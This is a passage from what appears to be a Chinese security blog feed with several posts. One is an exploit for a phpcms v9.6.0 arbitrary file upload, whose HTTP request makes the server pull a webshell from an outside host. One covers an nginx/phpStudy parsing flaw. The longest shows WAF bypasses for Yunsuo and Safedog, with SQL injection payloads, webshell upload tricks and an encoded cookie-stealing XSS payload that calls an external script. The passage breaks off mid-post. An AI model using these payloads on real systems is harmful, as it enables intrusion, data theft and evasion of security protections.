/phpcms_v9.6.0/install_package/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1 HTTP/1.1</span><br><span class="line">Host: 192.168.56.131</span><br><span class="line">User-Agent: python-requests/2.24.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 222</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">siteid=1&amp;modelid=11&amp;username=uqxatkplihzb&amp;password=hzrfinrakahg&amp;email=ylfjlwjuqbkb%40qq.com&amp;info%5Bcontent%5D=%3Cimg+src%3Dhttp%3A%2F%2Fwebshell-1257078281.cos.ap-nanjing.myqcloud.com%2F2234.txt%3F.php%23.jpg%3E&amp;dosubmit=1</span><br></pre></td></tr></table></figure><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1.png" width="1000"><p><strong>漏洞exp</strong></p><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2.jpg" width="1000"><p><strong>漏洞分析</strong></p><p>跟进注册文件位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpcms_v9.6.0\install_package\phpcms\modules\member\index.php</span><br></pre></td></tr></table></figure><p>1.使用new_html_special_chars进行编码</p><p>2.进入$member_input-&gt;get函数赋值给$user_model_info</p><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/3.png" width="1000"><p>跟进$member_input-&gt;get函数文件位置：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\phpcms_v9.6.0\install_package\caches\caches_model\caches_data\member_input.class.php</span><br></pre></td></tr></table></figure><p>使用$this-&gt;attachment-&gt;download函数进行下载</p><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/4.png" width="1000"><p>跟进函数文件位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\phpcms_v9.6.0\install_package\phpcms\libs\classes</span><br></pre></td></tr></table></figure><p>对$value进行转义，然后匹配正则</p><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/5.png" width="1000"><p>输入满足src/href=url.(gif|jpg|jpeg|bmp|png)，这种形式即可。</p><p>所以绕过的payloadl类似于下面这种格式是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=http://webshell-1257078281.cos.ap-nanjing.myqcloud.com/2234.txt?.php#.jpg&gt;</span><br></pre></td></tr></table></figure><p>当然</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=http://webshell-1257078281.cos.ap-nanjing.myqcloud.com/2234.txt?.php#.bmp&gt;</span><br></pre></td></tr></table></figure><p>也是可以的</p><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/6.png" width="1000"><p>接下来利用fillurl去除掉#后面的内容成为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=http://webshell-1257078281.cos.ap-nanjing.myqcloud.com/2234.txt?.php&gt;</span><br></pre></td></tr></table></figure><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/7.png" width="1000"><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/8.png" width="1000"><p>利用fileext来获取扩展名，即’php’</p><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/9.png" width="1000"><p>紧接着使用upload_func即copy函数进行远程下载</p><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/10.png" width="1000"><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/11.png" width="1000"><p>在phpcms_v9.6.0\install_package\phpcms\modules\member\index.php中，</p><p>当$status &gt; 0时会向v9_member_detail的content和userid两列插入数据</p><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/12.png" width="1000"><p>status大于0即</p><p>除掉用户名邮箱已存在，格式错误，禁止注册等情况下。所以最要是随机生成用户名或者邮箱写exp</p><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/13.png" width="1000"><p>在v9_member_detail表中没有列content</p><p>所以插入时会产生报错讲路径返回到前台。</p><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/14.png" width="1000"><p>构造payload即可成功写入webshell。</p><img src="/2020/11/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_phpcms_v9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/15.png" width="1000"><p><strong>漏洞修复：</strong></p><p>更新补丁，在获取文件扩展名后继续对扩展名进行检测。</p>]]></content>
    
    
    <summary type="html">&lt;h4 id=&quot;代码审计-phpcms-v9-6-0任意文件上传&quot;&gt;&lt;a href=&quot;#代码审计-phpcms-v9-6-0任意文件上传&quot; class=&quot;headerlink&quot; title=&quot;代码审计_phpcms_v9.6.0任意文件上传&quot;&gt;&lt;/a&gt;代码审计_phpcms_v9.6.0任意文件上传&lt;/h4&gt;</summary>
    
    
    
    <category term="代码审计" scheme="http://www.gsheller.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="安全研究" scheme="http://www.gsheller.top/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
  </entry>
  
  <entry>
    <title>ngnix解析漏洞（phpstudy最新版）</title>
    <link href="http://www.gsheller.top/2020/09/04/ngnix%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88phpstudy%E6%9C%80%E6%96%B0%E7%89%88%EF%BC%89/"/>
    <id>http://www.gsheller.top/2020/09/04/ngnix%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88phpstudy%E6%9C%80%E6%96%B0%E7%89%88%EF%BC%89/</id>
    <published>2020-09-04T02:13:26.000Z</published>
    <updated>2021-03-04T09:31:11.123Z</updated>
    
    <content type="html"><![CDATA[<p><strong>漏洞描述：</strong></p><p>phpStudy使用的nginx版本存在解析漏洞，攻击者能够利用上传功能，将包含恶意代码的合法文件类型上传至服务器，从而造成任意代码执行。（该漏洞仅存在于phpStudy Windows版，Linux版不受影响）。</p><p><strong>影响版本：</strong></p><p>phpstudy:phpstudy: &lt;=8.1.1.1</p><p>Nginx 0.8.41<del>1.4.3 / 1.5.0</del>1.5.7</p><p><strong>漏洞利用：</strong></p><p>最新版本phpstudy使用的Nginx为1.15.11</p><img src="/2020/09/04/ngnix%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88phpstudy%E6%9C%80%E6%96%B0%E7%89%88%EF%BC%89/1.png" width="1000"><p>上传图片马到网站</p><img src="/2020/09/04/ngnix%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88phpstudy%E6%9C%80%E6%96%B0%E7%89%88%EF%BC%89/2.png" width="1000"><p>利用解析漏洞执行命令（url结尾不一定是’.php’,任何服务器端不存在的php文件均可,比如’a.php’）</p><p><code>http://127.0.0.1/webshell/image.png/.php</code></p><img src="/2020/09/04/ngnix%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88phpstudy%E6%9C%80%E6%96%B0%E7%89%88%EF%BC%89/3.png" width="1000"><p><strong>漏洞分析：</strong></p><p>nginx把以’.php’结尾的文件交给fastcgi处理，当.php文件不存在的时候，由于</p><p>php.ini配置文件中</p><p>cgi.fix_pathinfo默认为1，cgi.fix_pathinfo=1作用：如果.php文件不存在,则取用上一级路径，所以变为了：</p><p><code>http://127.0.0.1/webshell/image.png</code></p><p>将<code>http://127.0.0.1/webshell/image.png</code>当作<code>http://127.0.0.1/webshell/image.png/.php</code>解析</p><img src="/2020/09/04/ngnix%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88phpstudy%E6%9C%80%E6%96%B0%E7%89%88%EF%BC%89/4.png" width="1000"><p><strong>漏洞修复：</strong></p><p>1、 将php.ini文件中的cgi.fix_pathinfo的值设置为0,这样php再解析1.php/1.jpg这样的目录时,只要1.jpg不存在就会显示404页面</p><p>2、 php-fpm.conf中的security.limit_extensions后面的值设置为.php</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞描述：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;phpStudy使用的nginx版本存在解析漏洞，攻击者能够利用上传功能，将包含恶意代码的合法文件类型上传至服务器，从而造成任意代码执行。（该漏洞仅存在于phpStudy Windows版，Linux版不受影响）。</summary>
      
    
    
    
    <category term="漏洞推送" scheme="http://www.gsheller.top/categories/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81/"/>
    
    
    <category term="漏洞推送" scheme="http://www.gsheller.top/tags/%E6%BC%8F%E6%B4%9E%E6%8E%A8%E9%80%81/"/>
    
  </entry>
  
  <entry>
    <title>最新版本云锁bypass</title>
    <link href="http://www.gsheller.top/2020/08/27/%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%BA%91%E9%94%81bypass/"/>
    <id>http://www.gsheller.top/2020/08/27/%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%BA%91%E9%94%81bypass/</id>
    <published>2020-08-27T07:35:27.000Z</published>
    <updated>2020-08-27T15:21:36.934Z</updated>
    
    <content type="html"><![CDATA[<h4 id="最新版本云锁bypass"><a href="#最新版本云锁bypass" class="headerlink" title="最新版本云锁bypass"></a>最新版本云锁bypass</h4><span id="more"></span><p>官网下载最新版云锁</p><p>最新版本：win_3.1.20.15</p><p>进程：</p><p>yunsuo_agent_daemon.exe    </p><p>yunsuo_agent_service.exe</p><p>应用防护，开启web防护</p><img src="/2020/08/27/%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%BA%91%E9%94%81bypass/1.png" width="1000"><p><img src="/2020/08/27/%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%BA%91%E9%94%81bypass/2.png"></p><h5 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1-sql注入"></a>1-sql注入</h5><p>1’ union select 1,2–+</p><p>触发云锁防护</p><p><img src="/2020/08/27/%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%BA%91%E9%94%81bypass/3.png"></p><p>云锁有默认防护和增强型防护</p><p><img src="/2020/08/27/%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%BA%91%E9%94%81bypass/4.png"></p><p><strong>默认防护**</strong>：**</p><p><strong>1-SQL注入</strong></p><p>盲注，发现压根不拦截。</p><p>id=1’ and 1=1–+</p><p><img src="/2020/08/27/%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%BA%91%E9%94%81bypass/5.png"></p><p>1’ and mid(user(),1,14)=’root@localhost’–+</p><p><img src="/2020/08/27/%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%BA%91%E9%94%81bypass/6.png"></p><p>–identify-waf</p><p>盲注和报错注入都不拦截，所以默认防护肯定不行。</p><p><img src="/2020/08/27/%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%BA%91%E9%94%81bypass/7.png"></p><p><strong>开启增强型防护：</strong></p><p><img src="/2020/08/27/%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%BA%91%E9%94%81bypass/8.png"></p><p>盲注已被拦截</p><p><img src="/2020/08/27/%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%BA%91%E9%94%81bypass/9.png"></p><p>继续sqlmap</p><p><img src="/2020/08/27/%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%BA%91%E9%94%81bypass/10.png"></p><p>仅仅扫出来一个时间注入，跑不出数据</p><p><img src="/2020/08/27/%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%BA%91%E9%94%81bypass/11.png"></p><p>绕过云锁：</p><p>%26%26代替and即可绕过。</p><p>1’ /<em>!%26%26</em>/ mid(user(),1,14)=’root@localhost’–+</p><p><img src="/2020/08/27/%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%BA%91%E9%94%81bypass/12.png"></p><h5 id="2-文件上传"><a href="#2-文件上传" class="headerlink" title="2-文件上传"></a><strong>2-文件上传</strong></h5><p>在云锁未开通文件防护白名单的情况下，</p><p><strong>绕过方法1：</strong></p><p>普通的一句话木马访问会被拦截，上传免杀一句话即可。</p><p><img src="/2020/08/27/%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%BA%91%E9%94%81bypass/13.png"></p><p><img src="/2020/08/27/%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%BA%91%E9%94%81bypass/14.png"></p><p><strong>绕过方法2：</strong></p><p>上传2.txt写入一句话，上传boahan.php去包含2.txt</p><p>即可绕过</p><p><img src="/2020/08/27/%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%BA%91%E9%94%81bypass/15.png"></p><p><img src="/2020/08/27/%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%BA%91%E9%94%81bypass/16.png"></p><h5 id="3-XSS"><a href="#3-XSS" class="headerlink" title="3-XSS"></a><strong>3-XSS</strong></h5><p>&lt;svg/onload=alert(1)&gt;被拦截</p><p><img src="/2020/08/27/%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%BA%91%E9%94%81bypass/17.png"></p><p>绕过方式：</p><p>使用base64编码直接绕过弹框</p><p><img src="/2020/08/27/%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%BA%91%E9%94%81bypass/18.png"></p><p>打cookie绕过方式:</p><p>%3Ciframe%20WIDTH%3D0%20HEIGHT%3D0%20srcdoc%3D%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%26%23x3C%3B%26%23x73%3B%26%23x43%3B%26%23x52%3B%26%23x69%3B%26%23x50%3B%26%23x74%3B%26%23x20%3B%26%23x73%3B%26%23x52%3B%26%23x43%3B%26%23x3D%3B%26%23x22%3B%26%23x68%3B%26%23x74%3B%26%23x74%3B%26%23x70%3B%26%23x73%3B%26%23x3A%3B%26%23x2F%3B%26%23x2F%3B%26%23x78%3B%26%23x73%3B%26%23x73%3B%26%23x2E%3B%26%23x70%3B%26%23x74%3B%26%23x2F%3B%26%23x63%3B%26%23x71%3B%26%23x56%3B%26%23x36%3B%26%23x22%3B%26%23x3E%3B%26%23x3C%3B%26%23x2F%3B%26%23x73%3B%26%23x43%3B%26%23x72%3B%26%23x49%3B%26%23x70%3B%26%23x54%3B%26%23x3E%3B%3E</p><p><img src="/2020/08/27/%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%BA%91%E9%94%81bypass/19.png"></p>]]></content>
    
    
    <summary type="html">&lt;h4 id=&quot;最新版本云锁bypass&quot;&gt;&lt;a href=&quot;#最新版本云锁bypass&quot; class=&quot;headerlink&quot; title=&quot;最新版本云锁bypass&quot;&gt;&lt;/a&gt;最新版本云锁bypass&lt;/h4&gt;</summary>
    
    
    
    <category term="waf绕过" scheme="http://www.gsheller.top/categories/waf%E7%BB%95%E8%BF%87/"/>
    
    
    <category term="bypass" scheme="http://www.gsheller.top/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>最新版安全狗bypass</title>
    <link href="http://www.gsheller.top/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/"/>
    <id>http://www.gsheller.top/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/</id>
    <published>2020-08-26T08:09:17.000Z</published>
    <updated>2021-03-04T09:30:59.390Z</updated>
    
    <content type="html"><![CDATA[<h5 id="最新版安全狗bypass"><a href="#最新版安全狗bypass" class="headerlink" title="最新版安全狗bypass"></a>最新版安全狗bypass</h5><span id="more"></span><p>官网下载最新版本网站安全狗安装</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/1.png"></p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/2.png"></p><h6 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1-SQL注入"></a><strong>1-SQL注入</strong></h6><p>无防护情况下</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/3.png"></p><p>有防护情况下，利用sqlmap</p><p>–identify-waf识别waf，识别为Safedog，注入无结果</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/4.png"></p><p>尝试无防护手注：</p><p>0=0，</p><p>为字符型注入</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/5.png"></p><p>1’ and ‘1’=’1</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/6.png"></p><p>1’ and ‘1’=’2</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/7.png"></p><p>1’ and mid(user(),1,14)=’root@localhost</p><p>盲注：用户名为root@localhost</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/8.png"></p><p>1’ and mid(user(),1,14)=’root@localhostxxx</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/9.png"></p><p>1’ order by 2–+</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/10.png"></p><p>1’ order by 3–+</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/11.png"></p><p>1’ union select user(),database()–+</p><p>联合注入：2个字段，用户名为root@localhost，数据库为dvwa</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/12.png"></p><p>开启安全狗防护，尝试绕过</p><p><strong>盲注绕过</strong></p><p>1’ and 1=1</p><p>被拦截</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/13.png"></p><p>1’ and /<em>!’1’</em>/=/<em>!’1’</em>/–+</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/14.png"></p><p>1’ and /<em>!’1’</em>/=/<em>!’2’</em>/–+</p><p>利用内敛注释即可绕过and 1=1的检测</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/15.png"></p><p>测试发现使用a会被拦截，1和2不拦截，</p><p>1’ and /<em>!’a’</em>/=/<em>!’1’</em>/–+</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/16.png"></p><p>那么换一种思路，我们来替换and，</p><p>1’ /<em>!%26%26</em>/ 1=1–+</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/17.png"></p><p>1’ /<em>!%26%26</em>/ ‘aa’=’a’–+</p><p>成功绕过</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/18.png"></p><p>尝试获取数据库字符，被拦截</p><p>1’ /<em>!%26%26</em>/ mid(database(),1,1)=’d’–+</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/19.png"></p><p>1’ /<em>!%26%26</em>/ mid(database/<strong>/(/</strong>/),1,4)=’dvwa’–+</p><p>拦截的是database(),添加两个内敛注释成功绕过盲注</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/20.png"></p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/21.png"></p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/21.png"></p><p><strong>联合注入绕过</strong></p><p><strong>方法一：</strong></p><p>order by拦截，但是group by不拦截</p><p>1’ order by 3–+</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/23.png"></p><p>1’ group by 2–+</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/24.png"></p><p>1’ group by 3–+</p><p>字段为2</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/25.png"></p><p>union select组合被拦截</p><p>1’ union select–+</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/26.png"></p><p>1’ union /<em>!select</em>/ 1,2–+</p><p>内敛注释也被拦</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/27.png"></p><p>这里有一个姿势，通过添加版本号绕过</p><p>1’ union /<em>!10044select</em>/ 1,2–+</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/28.png"></p><p>1’ union /<em>!10044select</em>/ /<em>!@@datadir</em>/,2–+</p><p>注入出数据库文件存放路径</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/29.png"></p><p>1’ union /<em>!10044select</em>/ @@version_compile_os,2–+</p><p>注入出服务器版本</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/30.png"></p><p><strong>方法二</strong></p><p>1’ /<strong>//<em>!order</em>//</strong>/%23A%0a/<em>!by</em>//<strong>/2/</strong>/–+</p><p>%23 是注释符，%0A 是换行，</p><p>%23后面语句不执行，而再加上%0a换行，后面的语句又能成功执行了</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/31.png"></p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/32.png"></p><p>1’ /<strong>//<em>!union</em>//</strong>/%23A%0a/<em>!select</em>//<strong>/1,2/</strong>/–+</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/33.png"></p><p>1’ /<strong>//<em>!union</em>//</strong>/%23A%0a/<em>!select</em>//<strong>/@@version_compile_os,@@datadir/</strong>/–+</p><p>成功注入</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/34.png"></p><p><strong>参数污染绕过</strong></p><p>?id=/<em>&amp;id=1’ union select database(),user()%23</em>/</p><p>%23注释掉后面的*/，mysql实际传入的是id=1’ union select database(),user()，但是安全狗以为传入的是id=/*，所以不做任何拦截，直接绕过</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/35.png"></p><p>?id=/<em>&amp;id=1’ and mid(user(),1,14)=’root@localhost’%23</em>/</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/36.png"></p><p>利用参数污染结合本地中转即可利用sqlmap注入出数据</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/37.png"></p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/38.png"></p><h6 id="2-文件上传"><a href="#2-文件上传" class="headerlink" title="2-文件上传"></a><strong>2-文件上传</strong></h6><p>无防护，直接上传</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/39.png"></p><p>开启安全狗防护，直接返回500</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/40.png"></p><p>非法文件上传</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/41.png"></p><p><strong>绕过上传方法1：</strong></p><p>在php中间按回车发包，成功绕过限制</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/42.png"></p><p>访问的时候触发安全狗，</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/43.png"></p><p>拦截原因为一句话木马</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/44.png"></p><p>替换为过狗webshell</p><p>注：这种拼接字符串方式的webshell可以过安全狗，但是过不了其他的查杀工具，每个查杀工具的查杀规则不一样。需要依据waf或者杀软来制作相应的免杀的webshell。</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/45.png"></p><p>成功绕过安全狗上传并执行命令</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/46.png"></p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/47.png"></p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/48.png"></p><p><strong>绕过上传方法2：</strong></p><p>利用两个等号绕过</p><p>filename==”3.php”</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/49.png"></p><p><strong>绕过上传方法3：</strong></p><p>利用filename=;进行绕过</p><p>filename=;filename=”3.php”</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/50.png"></p><p><strong>绕过上传方法4：</strong></p><p>利用一堆的无用文件头即可绕过，在请求体前面添加，注意要和请求头空一行</p><p>filename=;filename=”3.php”</p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/51.png"></p><p><img src="/2020/08/26/%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E5%85%A8%E7%8B%97bypass/52.png"></p><h6 id="3-XSS"><a href="#3-XSS" class="headerlink" title="3-XSS"></a><strong>3-XSS</strong></h6><p>&lt;svg/onload=alert(1)&gt;</p><p>被拦截</p><p><img 